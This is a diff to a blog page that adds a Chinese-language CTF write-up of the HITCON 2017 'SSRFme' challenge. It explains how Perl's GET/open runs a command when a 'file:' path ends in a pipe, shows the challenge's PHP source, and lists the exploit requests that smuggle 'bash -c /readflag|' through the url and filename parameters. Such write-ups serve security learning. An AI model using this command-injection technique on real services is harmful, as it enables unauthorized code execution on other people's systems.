@@ -85,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/06/page-99/">page</a>
+      <a class="p-name article-title" href="/2021/08/06/page-99/">HITCON 2017SSRFme</a>
     </h1>
   
 
@@ -93,11 +93,37 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <p>这考点：<strong>get的任意命令执行 调用命令get来执行从url中获取的参数 然后按照filename新建文件写入get的结果</strong><br>perl里的get函数底层就是调用了open处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file.pm</span><br><span class="line">84: opendir(D, $path) or</span><br><span class="line">132:    open(F, $path) or return new</span><br></pre></td></tr></table></figure>
+
+<p>perl脚本中get命令执行漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch &#x27;id|&#x27;</span><br><span class="line">GET ’file:id|&#x27;</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>在perl下如果**open第二个参数(path)**可控就能进行任意代码执行 就类似于把一个文件名拼接入命令导致的命令执行<br>这题给了源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);  // explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    </span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   // “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 </span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);     // 改变当前的目录到$sandbox</span><br><span class="line">    </span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     // escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);  // pathinfo() 函数以数组的形式返回文件路径的信息。</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));   // basename() 函数返回路径中的文件名部分。</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    // 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>**escapeshellarg($arg)**把字符串转码成可在shell命令函数执行的参数，给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号<br>确保能直接将一个字符串传入shell函数 而且还是确保安全的。输入的部分参数就会使用这个函数 <strong>shell函数包含exec() system() 反引号(``)</strong> </p>
+<p>arg：需要被转码的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pathinfo() 返回一个数组包含path的信息 有一下几个数组元素</span><br><span class="line">[dirname]  //路径</span><br><span class="line">[basename]  //文件名</span><br><span class="line">[extension]  //拓展名</span><br></pre></td></tr></table></figure>
+
+<p>比如：</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/171.PNG?raw=true" alt="171.PNG"></p>
+<p>对传入的参数进行<strong>escapeshellarg函数过滤</strong> <strong>创建一个目录 sandbo/md5(orange+ip)</strong> 然后执行get$_get[‘url’] 然后创建文件夹<br>并将get后的结果放入该<strong>文件夹下filename</strong>传入文件中</p>
+<p><strong>remote_addr显示当前浏览该页面用户的ip题目已给出</strong><br><strong>sandbox的目录就是sandbox/09813651a41a9196d2053cdecf08dd70</strong></p>
+<p>先创建文件aaa然后访问 ?url=/&amp;filename=aaa</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/169.PNG?raw=true" alt="169.PNG"></p>
+<p>然后访问sandbox/09813651a41a9196d2053cdecf08dd70/aaa</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/170.PNG?raw=true" alt="170.PNG"></p>
+<p>一个readflag 一个flag 正常是得执行readflag然后才能拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perl的open命令可能造成命令执行</span><br><span class="line">首先得满足文件存在然后才会继续open语句 所有执行命令前得先搞一个同名文件</span><br><span class="line">?url=&amp;filename=bash -c /readflag| 先创建一个bash -c /readflag| 的文件 用于之后的命令执行</span><br><span class="line">?url=file:bash -c /readflag|&amp;filename=aaa 再利用get执行bash -c /readflag|保存到文件中</span><br></pre></td></tr></table></figure>
+
+<p>访问 aaa即可</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/172.PNG?raw=true" alt="172.PNG"></p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/06/page-99/" data-id="ckrzxy2aw0008o4w72f10g88h" data-title="page" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/08/06/page-99/" data-id="ckrzxy2aw0008o4w72f10g88h" data-title="HITCON 2017SSRFme" class="article-share-link">Share</a>
       
       
       
@@ -679,7 +705,7 @@
       <ul>
         
           <li>
-            <a href="/2021/08/06/page-99/">page</a>
+            <a href="/2021/08/06/page-99/">HITCON 2017SSRFme</a>
           </li>
         
           <li>
